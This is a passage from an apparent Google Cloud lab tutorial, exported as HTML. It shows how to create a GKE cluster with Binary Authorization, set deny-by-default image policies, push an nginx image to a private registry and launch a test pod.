instructions are applicable for deployments performed both with and without Cloud Shell.</span></p><ul><li><p><span>To deploy the cluster, execute the following command. Feel free to replace the text </span><code>my-cluster-1</code><span> with the name of the cluster that you would like to create.</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./create.sh -c my-cluster-1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The </span><code>create</code><span> script will output the following message when complete:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubeconfig entry generated for my-cluster-1.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp;  LOCATION &nbsp; &nbsp; &nbsp; MASTER_VERSION  MASTER_IP &nbsp; &nbsp; &nbsp;  MACHINE_TYPE &nbsp; NODE_VERSION &nbsp; NUM_NODES  STATUS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">my-cluster-1  europe-west4-c  1.14.8-gke.17 &nbsp; 104.154.181.211  n1-standard-1  1.14.8-gke.17  2 &nbsp; &nbsp; &nbsp; &nbsp;  RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Fetching cluster endpoint and auth data.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubeconfig entry generated for my-cluster-1.</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>The script will:</span></p><ol start='' ><li><p><span>Enable the necessary APIs in your project. Specifically, </span><code>container</code><span>, </span><code>containerregistry</code><span>, </span><code>containeranalysis</code><span>, and </span><code>binaryauthorization</code><span>.</span></p></li><li><p><span>Create a new Kubernetes Engine cluster in your default ZONE, VPC and network.</span></p></li><li><p><span>Retrieve your cluster credentials to enable </span><code>kubectl</code><span> usage.</span></p></li></ol><p><span>It is safe to ignore warnings.</span></p><h2 id='task-4-validation'><span>Task 4. Validation</span></h2><ul><li><p><span>The following script will validate that the demo is deployed correctly:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./validate.sh -c my-cluster-1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>If the script fails, it will output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Validation Failed: the BinAuthZ policy was NOT available</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>And / Or</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Validation Failed: the Container Analysis API was NOT available</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>If the script passes, it will output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Validation Passed: the BinAuthZ policy was available</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Validation Passed: the Container Analysis API was available</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='test-completed-task'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created a Kubernetes cluster with Binary Authorization, you will see an assessment score.</span></p><p><span>Create a Kubernetes Cluster with Binary Authorization</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><h2 id='task-5-using-binary-authorization'><span>Task 5. Using Binary Authorization</span></h2><h3 id='managing-the-binary-authorization-policy'><span>Managing the Binary Authorization Policy</span></h3><p><span>To access the Binary Authorization Policy configuration UI, perform the following steps:</span></p><ol start='' ><li><p><span>In the Google Cloud console, navigate to the </span><strong><span>Security</span></strong><span> &gt; </span><strong><span>Binary Authorization</span></strong><span>.</span></p></li></ol><p><img src="images\cQrrp%2B6bsJKEXu39TVLLUdvYCdfqP9Gnt48eAvj2IkM%3D" referrerpolicy="no-referrer" alt="Expanded Navigation menu with Binary Authorization option highlighted"></p><ol start='' ><li><p><span>Click </span><strong><span>Edit Policy</span></strong><span>.</span></p></li></ol><p><img src="images\wl5ZMPyosClr7wP49wNtjd5MhFfDSFKMX7eD8fwGJ1Y%3D" referrerpolicy="no-referrer" alt="Welcome to Binary Authorization page"></p><p><strong><span>Note:</span></strong><span> To access the Binary Authorization Policy configuration via </span><code>gcloud</code><span>:</span></p><p>&nbsp;</p><p><span>Run </span><code>gcloud beta container binauthz policy export &gt; policy.yaml</code></p><p><span>Make the necessary edits to </span><code>policy.yaml</code></p><p><span>Run </span><code>gcloud beta container binauthz policy import policy.yaml</code></p><p><span>The policy you are editing is the &quot;default&quot; policy, and it applies to </span><em><span>all GKE clusters in the Google Cloud project</span></em><span> unless a cluster-specific policy is in place.</span></p><p><span>The recommendation is to create policies specific to each cluster and achieve successful operation (allowlisting registries as needed), and then set the default project-level policy to &quot;Deny All Images&quot;. Any new cluster in this project will then need its own cluster-specific policy.</span></p><ol start='' ><li><p><span>After clicking </span><strong><span>Edit Policy</span></strong><span>, the following will appear. Click the down arrow next to </span><strong><span>Custom Exemption Rules</span></strong><span> to display them:</span></p></li></ol><p><img src="images\CmRacBbcv%2F71DhcVphuzjRJbiukvrRLKhTdeTW2zosU%3D" referrerpolicy="no-referrer" alt="Edit policy page"></p><p><span>The default policy rule is to </span><code>Allow all images</code><span>. This mimics the behavior as if Binary Authorization wasn&#39;t enabled on the cluster.</span></p><p><span>If the default rule is changed to </span><code>Disallow all images</code><span> or </span><code>Allow only images that have been approved by all of the following attestors</code><span>, then images that do not match the exempted registry image paths or do not have the required attestations will be blocked, respectively.</span></p><p><span>Next, you will make some edits to the policy:</span></p><ol start='' ><li><p><span>Change your </span><strong><span>Default rule</span></strong><span> to </span><code>Disallow all images</code></p></li><li><p><span>In Additional settings for GKE and Anthos deployments, click </span><strong><span>Create Specific Rules</span></strong><span>.</span></p></li><li><p><span>Select </span><strong><span>GKE Cluster</span></strong><span> from the dropdown and click </span><strong><span>Change</span></strong><span>.</span></p></li><li><p><span>Under </span><strong><span>GKE Cluster-specific rules</span></strong><span>, Click </span><strong><span>Add Specific Rule</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Add GKE Cluster-specific rule</span></strong><span> field, enter your location and cluster name in the form </span><code>location.clustername</code><span>. e.g. </span><code>europe-west4-c</code><span>.my-cluster-1 which corresponds to the zone </span><code>europe-west4-c</code><span> and the cluster name </span><code>my-cluster-1</code><span>.</span></p></li><li><p><span>Select the default rule of </span><code>Allow all images</code><span> for your cluster.</span></p></li><li><p><span>Click </span><strong><span>ADD</span></strong><span>.</span></p></li></ol><p><img src="images\BYn8k8jI2f9%2F31X1iPUbrOfNrudtD7rT5MQAxRqxkDI%3D" referrerpolicy="no-referrer" alt="Add GKE cluster specific rule dialog box"></p><ol start='' ><li><p><span>Click </span><strong><span>Save Policy</span></strong><span>.</span></p></li></ol><h3 id='test-completed-task-2'><span>Test completed task</span></h3><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully updated Binary Authorization Policy to add Disallow all images rule at project level and allow all images at cluster level, you will see an assessment score.</span></p><p><span>Update Binary Authorization Policy to add Disallow all images rule at project level and allow at cluster level</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><h2 id='task-6-creating-a-private-gcr-image'><span>Task 6. Creating a private GCR image</span></h2><ol start='' ><li><p><span>To simulate a real-world configuration, create a private GCR container image in your project.</span></p></li><li><p><span>You will pull down the </span><code>nginx</code><span> container from </span><code>nginx</code><span> project and push it to your own GCR repository without modification.</span></p></li><li><p><span>In Cloud Shell, pull down the </span><code>latest</code><span> </span><code>nginx</code><span> container:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">docker pull nginx:latest</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Authenticate docker to the project:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth configure-docker</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>When prompted, </span><code>Do you want to continue (Y/n)?</code><span> Enter </span><code>Y</code><span>.</span></p><ol start='' ><li><p><span>Set the PROJECT_ID shell variable:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PROJECT_ID="$(gcloud config get-value project)"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Tag and push it to the current project&#39;s GCR:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">docker tag nginx "gcr.io/${PROJECT_ID}/nginx:latest"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">docker push "gcr.io/${PROJECT_ID}/nginx:latest"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>List the &quot;private&quot; nginx image in your own GCR repository:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud container images list-tags "gcr.io/${PROJECT_ID}/nginx"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h2 id='task-7-denying-all-images'><span>Task 7. Denying all images</span></h2><p><span>To prove that image denial by policy will eventually work as intended, first verify that the cluster-specific </span><code>allow</code><span> rule is in place and allows all containers to run.</span></p><ol start='' ><li><p><span>To do this, launch a single </span><code>nginx</code><span> pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt; EOF | kubectl create -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: nginx</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: "gcr.io/${PROJECT_ID}/nginx:latest"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  ports:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  - containerPort: 80</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 270px;"></div><div class="CodeMirror-gutters" style="display: none; height: 270px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see a message stating that </span><code>pod/nginx created</code><span>.</span></p><ol start='' ><li><p><span>List the pods:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 